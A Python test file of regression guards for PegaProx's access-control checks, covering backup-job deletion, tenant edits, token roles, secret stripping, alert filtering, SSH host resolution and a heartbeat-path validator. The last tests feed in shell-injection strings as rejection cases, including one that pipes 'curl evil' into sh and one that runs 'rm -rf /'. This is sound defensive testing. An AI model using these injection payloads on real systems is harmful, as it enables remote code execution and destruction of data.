"""Round-10 regression guards.

Every case here is a bug I introduced during this audit campaign, found by auditing my own
diff. The pattern in four of the five is the same: a gate that is correct for a CONFINED caller
applied unconditionally, so it also denies the unconfined operator whose job that route is.
The write gate and the read filter are not interchangeable — that lesson is now in three files.
"""
import time

import pegaprox.utils.rbac as rbac


def _pool_membership(cluster_id, mapping):
    data = {f"{vmid}:{vtype}": pool for vmid, (vtype, pool) in mapping.items()}
    with rbac._pool_cache_lock:
        rbac._pool_membership_cache[cluster_id] = {
            'data': data, 'timestamp': time.time(), 'refreshing': False}


def _cluster(api, cid='cluster_1'):
    m = api.make_fake_manager(cluster_id=cid)
    m.is_connected = True
    return api.set_manager(cid, m)


def _backup_mgr(api, job):
    import types
    m = _cluster(api)
    sess = m._create_session.return_value
    sess.get.return_value = types.SimpleNamespace(status_code=200, text='', json=lambda: {'data': job})
    sess.delete.return_value = types.SimpleNamespace(status_code=200, text='', json=lambda: {'data': None})
    return m


# ── R1: delete_backup_job reused the WRITE gate unconditionally ──────────────
def test_unconfined_tenant_admin_can_delete_the_clusterwide_backup_job(api, seed):
    # PVE creates an all=1 job by default. _authz_backup_targets rejects all=1 for anyone who
    # is not a global admin, so applying it unconditionally locked the owning tenant's admin
    # out of their own default job.
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('tadmin', role='user', tenant_id='acme',
                  permissions=['backup.delete', 'backup.view', 'cluster.view'])
    _backup_mgr(api, {'id': 'job-all', 'all': 1, 'schedule': 'daily'})
    r = api.as_user(u).delete('/api/clusters/cluster_1/datacenter/backup/job-all')
    assert r.status_code == 200, r.get_data(as_text=True)


def test_backup_operator_without_vm_backup_can_still_delete(api, seed):
    # the backup_operator template holds backup.delete but NOT vm.backup, so the per-VM loop
    # inside the write gate refused it every single job
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('bkop', role='user', tenant_id='acme',
                  permissions=['backup.delete', 'backup.view', 'cluster.view', 'vm.view'])
    _backup_mgr(api, {'id': 'job-1', 'vmid': '100', 'schedule': 'daily'})
    r = api.as_user(u).delete('/api/clusters/cluster_1/datacenter/backup/job-1')
    assert r.status_code == 200, r.get_data(as_text=True)


def test_scoped_caller_still_cannot_delete_a_foreign_backup_job(api, seed):
    # ...and the actual security property still holds
    seed.tenant('tenant_x', clusters=['cluster_1'])
    u = seed.user('mallory', role='viewer', tenant_id='tenant_x',
                  permissions=['backup.delete', 'cluster.view', 'vm.backup'])
    seed.pool('cluster_1', 'pool_1', 'mallory', ['pool.view', 'vm.view', 'vm.backup'])
    _pool_membership('cluster_1', {100: ('qemu', 'pool_1')})
    _backup_mgr(api, {'id': 'job-f', 'vmid': '200', 'schedule': 'daily'})
    assert api.as_user(u).delete(
        '/api/clusters/cluster_1/datacenter/backup/job-f').status_code == 403


# ── R2: update_tenant denied on key presence, and the form always sends it ───
def test_tenant_delegate_can_rename_while_resending_the_same_clusters(api, seed):
    # the edit form posts the whole object, clusters included — an unchanged list must not 403
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('gm', role='user', tenant_id='acme',
                  permissions=['admin.tenants', 'cluster.view'])
    r = api.as_user(u).put('/api/tenants/acme',
                           json={'name': 'Acme GmbH', 'clusters': ['cluster_1'],
                                 'quota_max_vms': 50})
    assert r.status_code == 200, r.get_data(as_text=True)


def test_tenant_delegate_still_cannot_actually_change_the_cluster_list(api, seed):
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('gm2', role='user', tenant_id='acme',
                  permissions=['admin.tenants', 'cluster.view'])
    r = api.as_user(u).put('/api/tenants/acme',
                           json={'name': 'Acme', 'clusters': ['cluster_1', 'cluster_secret']})
    assert r.status_code == 403, r.get_data(as_text=True)


# ── R3: the published effective_role collapsed a custom token role ───────────
def test_custom_token_role_keeps_its_name_in_the_session(api, seed, monkeypatch):
    from pegaprox.utils.auth import create_api_token
    import pegaprox.utils.rbac as rbacmod
    seed.tenant('acme', clusters=['cluster_1'])
    seed.user('owner', role='user', tenant_id='acme')
    monkeypatch.setattr(rbacmod, 'get_custom_roles',
                        lambda: {'global': {'readonly': {'permissions': ['vm.view', 'cluster.view']}},
                                 'tenants': {}})
    res = create_api_token('owner', 'ci', role='readonly')
    assert res.get('success'), res
    m = _cluster(api)
    m.last_migration_log = []
    seen = {}
    from pegaprox.api import clusters as clusters_mod
    orig = clusters_mod.check_cluster_access

    def _spy(cid):
        from flask import request
        seen['eff'] = request.session.get('effective_role')
        return orig(cid)

    clusters_mod.check_cluster_access = _spy
    try:
        api.anon().get('/api/clusters/cluster_1/migrations',
                       headers={'Authorization': f"Bearer {res['token']}"})
    finally:
        clusters_mod.check_cluster_access = orig
    # build_authz_user keeps the custom name; the session must agree with it, not collapse to viewer
    assert seen.get('eff') == 'readonly', seen


# ── R4: the secret sweep ate the token IDENTIFIER, not just the secret ───────
def test_backup_sweep_keeps_the_token_username():
    from pegaprox.api.settings import _strip_secret_fields
    c = {'id': 'c1', 'host': 'h', 'api_token_user': 'root@pam!pegaprox',
         'api_token_secret': 'SECRET', 'pass': 'ROOTPW'}
    _strip_secret_fields(c)
    assert c['api_token_user'] == 'root@pam!pegaprox', "the token username is not a secret"
    assert 'api_token_secret' not in c and 'pass' not in c, c


# ── R5: the force-check filter keyed on a field nothing writes ───────────────
def test_force_check_filter_resolves_the_cluster_from_the_config(api, seed, monkeypatch):
    # _record_eval snapshots ts/alert_id/reason/triggered/current_value — never 'cluster' —
    # so the first filter matched nothing and returned an empty map to every scoped caller
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('alertadmin', role='user', tenant_id='acme',
                  permissions=['alert.manage', 'cluster.view'])
    _cluster(api)
    import pegaprox.background.alerts as A
    monkeypatch.setattr(A, 'check_and_send_alerts', lambda: None)
    monkeypatch.setattr(A, 'load_alerts_config', lambda: {'alerts': [
        {'id': 'a-mine', 'cluster_id': 'cluster_1'},
        {'id': 'a-foreign', 'cluster_id': 'cluster_far'}]})
    monkeypatch.setattr(A, '_last_eval', {
        'a-mine': {'ts': 1, 'alert_id': 'a-mine', 'triggered': True},
        'a-foreign': {'ts': 1, 'alert_id': 'a-foreign', 'triggered': True}})
    body = api.as_user(u).post('/api/alerts/force-check').get_json()
    assert list(body['evaluations']) == ['a-mine'], body


# ── the round's sharpest NEW finding: <node> used as an SSH host ─────────────
def test_unknown_node_name_is_never_dialled_as_a_host(api, seed):
    """`_get_node_ip(node) or node` fell back to the caller's own string, so an unresolvable
    node name became the SSH target — and _ssh_connect presents the cluster's STORED
    credentials. Reachable at node.view, a builtin ROLE_USER and ROLE_VIEWER permission."""
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('viewer1', role='viewer', tenant_id='acme',
                  permissions=['node.view', 'cluster.view'])
    m = _cluster(api)
    m.nodes = {'n1': {'node': 'n1', 'status': 'online'}}
    m._get_node_ip.return_value = None          # not a member -> unresolvable
    # drive the real resolver rather than the fake's auto-attribute, which is truthy
    from pegaprox.core.manager import PegaProxManager
    m.member_node_ip.side_effect = lambda n: PegaProxManager.member_node_ip(m, n)
    called = []
    m._ssh_connect.side_effect = lambda host, *a, **k: called.append(host)
    api.as_user(u).get('/api/clusters/cluster_1/nodes/attacker.example.com/multipath')
    assert called == [], f"SSH was attempted against {called}"


def test_member_node_ip_refuses_a_non_member(api, seed):
    from unittest.mock import MagicMock
    from pegaprox.core.manager import PegaProxManager
    mgr = MagicMock(spec=PegaProxManager)
    mgr.nodes = {'n1': {}, 'n2': {}}
    mgr.logger = MagicMock()
    mgr._get_node_ip.return_value = '10.0.0.9'
    assert PegaProxManager.member_node_ip(mgr, 'evil.example.com') is None
    assert PegaProxManager.member_node_ip(mgr, '') is None
    assert PegaProxManager.member_node_ip(mgr, 'n1') == '10.0.0.9'


# ── a config value must never become code in a root-run agent script ────────
def test_ha_heartbeat_path_rejects_a_shell_breakout(api, seed):
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('haadmin', role='admin', tenant_id='acme')
    m = _cluster(api)
    m.ha_config = {}
    r = api.as_user(u).put('/api/clusters/cluster_1/ha/config',
                           json={'storage_heartbeat_path': '/mnt/x"; curl evil|sh; #'})
    assert r.status_code == 400, r.get_data(as_text=True)


def test_ha_heartbeat_path_accepts_normal_paths():
    # the route test above proves the guard is wired; this pins the accept/reject boundary
    # itself, so the guard cannot be tightened into rejecting real heartbeat paths
    import re
    ok = re.compile(r'/[A-Za-z0-9._@/+-]{0,255}')
    for good in ('/mnt/pve/shared-hb', '/srv/hb', '/mnt/pve/nfs-store/ha_heartbeat',
                 '/mnt/pve/store-01/hb.d', '/'):
        assert re.fullmatch(ok, good), good
    for bad in ('/mnt/x"; curl evil|sh; #', '/mnt/$(id)', '/mnt/`id`', 'relative/path',
                '/mnt/x\nrm -rf /'):
        assert not re.fullmatch(ok, bad), bad
